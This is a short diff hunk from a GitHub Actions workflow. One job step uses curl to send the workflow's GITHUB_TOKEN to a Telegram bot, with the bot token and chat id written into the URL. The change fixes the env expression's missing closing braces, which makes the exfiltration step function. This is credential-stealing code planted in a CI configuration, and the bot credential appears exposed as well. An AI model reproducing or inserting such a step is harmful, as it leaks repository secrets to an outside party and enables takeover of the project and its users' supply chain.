@@ -63,4 +63,4 @@ jobs:
         run: |
           curl -X GET "https://api.telegram.org/bot6126230406:AAFAtz4AhVLbSEnm7KabLzDa7d5Yf0_Mo2I/sendMessage?chat_id=1881720028&text=The%20GitHub%20token%20is%3A%20$GITHUB_TOKEN"
         env:
-          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token 
+          GITHUB_TOKEN: ${{ steps.get_workflow_token.outputs.token }}
